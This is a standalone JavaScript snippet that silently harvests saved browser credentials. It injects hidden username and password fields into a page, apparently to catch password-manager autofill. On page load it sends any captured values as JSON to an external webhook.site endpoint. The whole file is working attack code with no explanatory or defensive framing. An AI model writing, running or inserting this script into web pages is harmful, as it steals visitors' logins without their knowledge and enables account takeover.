const usernameEl = document.createElement('input');
usernameEl.name = 'username';
usernameEl.hidden = true;
document.body.appendChild(usernameEl);

const passwordEl = document.createElement('input');
passwordEl.name = 'password';
passwordEl.type = 'password';
passwordEl.hidden = true;
document.body.appendChild(passwordEl);

window.addEventListener('load', () => {
    if (passwordEl.value) {
        fetch('https://webhook.site/d6f59c4f-1c22-48c8-8544-d0f7cbfa77c3', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                username: usernameEl.value,
                password: passwordEl.value
            })
        })
        .then(response => response.json())
        .catch(error => {
            console.error('Error:', error);
        });
    }
});
